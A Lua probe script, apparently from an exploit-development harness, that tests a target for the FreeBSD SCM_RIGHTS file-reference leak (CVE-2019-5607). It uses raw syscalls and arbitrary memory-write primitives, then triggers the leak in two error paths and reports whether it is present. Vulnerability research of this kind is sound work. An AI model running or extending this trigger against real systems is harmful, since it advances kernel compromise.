-- CRASH_CLASS: LOW
-- PROBE 662a: CVE-2019-5607 (FreeBSD-SA-19:17.fd) — when a UNIX-socket rights
-- transfer fails, are the acquired file references released?
-- Oracle: pass socket Q0 over P, close our Q0, then read Q1. EOF means the
-- file was freed (references released); EAGAIN means a reference leaked and
-- the socket is still open.
print("=== PROBE 662a: SCM_RIGHTS REFCOUNT LEAK ON A FAILED SEND ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rdd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function z(a,n) for k=0,n-8,8 do wq(N(a)+k,uint64(0)) end end
local function pair() local s=memory.alloc(8); z(s,8)
  local r=N(select(2,pcall(function() return mk(135)(U(1),U(1),U(0),U(N(s)),U(0),U(0)) end)))
  return r, rdd(N(s)), rdd(N(s)+4) end
local function nonblock(fd) return N(select(2,pcall(function() return mk(92)(U(fd),U(4),U(4),U(0),U(0),U(0)) end))) end
local function rd1(fd) local b=memory.alloc(8); z(b,8)
  local r=select(2,pcall(function() return mk(29)(U(fd),U(N(b)),U(1),U(0x80),U(0),U(0)) end))
  return N(r) end
local function cls(fd) return N(select(2,pcall(function() return mk(6)(U(fd),U(0),U(0),U(0),U(0),U(0)) end))) end
local data=memory.alloc(16); wb(N(data),65)
local iov=memory.alloc(16); wq(N(iov),N(data)); wq(N(iov)+8,1)
local function sendfd(P0,Q0,flags)
  local ctl=memory.alloc(64); z(ctl,64)
  wd(N(ctl),20); wd(N(ctl)+4,0xFFFF); wd(N(ctl)+8,1); wd(N(ctl)+0x10,Q0)
  local mh=memory.alloc(0x40); z(mh,0x40)
  wq(N(mh)+0x10,N(iov)); wq(N(mh)+0x18,1); wq(N(mh)+0x20,N(ctl)); wd(N(mh)+0x28,24)
  return N(select(2,pcall(function() return mk(28)(U(P0),U(N(mh)),U(flags or 0),U(0),U(0),U(0)) end)))
end
-- [A] control: a successful send keeps the passed socket alive until P closes
local _,P0,P1=pair(); local _,Q0,Q1=pair()
nonblock(P0); nonblock(Q0); nonblock(Q1)
print(string.format("[A] P=%s/%s Q=%s/%s",tostring(P0),tostring(P1),tostring(Q0),tostring(Q1)))
print(string.format("[A1] sendfd ok ret=%s",tostring(sendfd(P0,Q0,0))))
print(string.format("[A2] close(Q0)=%s read(Q1)=%s (EAGAIN expected: in-flight ref)",tostring(cls(Q0)),tostring(rd1(Q1))))
print(string.format("[A3] close(P0)=%s read(Q1)=%s (0 expected: ref released)",tostring(cls(P0)),tostring(rd1(Q1))))
-- [B] error path: send with the peer already closed
local _,R0,R1=pair(); local _,S0,S1=pair()
nonblock(R0); nonblock(S0); nonblock(S1)
print(string.format("[B] R=%s/%s S=%s/%s",tostring(R0),tostring(R1),tostring(S0),tostring(S1)))
print(string.format("[B1] close(R1) peer first = %s",tostring(cls(R1))))
print(string.format("[B2] sendfd on dead peer ret=%s",tostring(sendfd(R0,S0,0))))
print(string.format("[B3] close(S0)=%s read(S1)=%s (0=fixed, -1=LEAK)",tostring(cls(S0)),tostring(rd1(S1))))
-- [C] error path: non-blocking send into a full buffer
local _,T0,T1=pair(); local _,U0,U1=pair()
nonblock(T0); nonblock(U0); nonblock(U1)
pcall(function() mk(105)(U(T0),U(0xFFFF),U(0x1001),U(N(memory.alloc(8))),U(4),U(0)) end)
local big=memory.alloc(0x20000)
local b_iov=memory.alloc(16); wq(N(b_iov),N(big)); wq(N(b_iov)+8,0x20000)
local sent=0
for i=1,20 do
  local ctl=memory.alloc(64); z(ctl,64)
  wd(N(ctl),20); wd(N(ctl)+4,0xFFFF); wd(N(ctl)+8,1); wd(N(ctl)+0x10,U0)
  local mh=memory.alloc(0x40); z(mh,0x40)
  wq(N(mh)+0x10,N(b_iov)); wq(N(mh)+0x18,1); wq(N(mh)+0x20,N(ctl)); wd(N(mh)+0x28,24)
  local r=N(select(2,pcall(function() return mk(28)(U(T0),U(N(mh)),U(0x80),U(0),U(0),U(0)) end)))
  if r>0 then sent=sent+1 end
end
print(string.format("[C1] filled with %d sends",sent))
print(string.format("[C2] close(U0)=%s read(U1)=%s",tostring(cls(U0)),tostring(rd1(U1))))
print(string.format("[C3] drain+close(T0)=%s read(U1)=%s",tostring(cls(T0)),tostring(rd1(U1))))
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
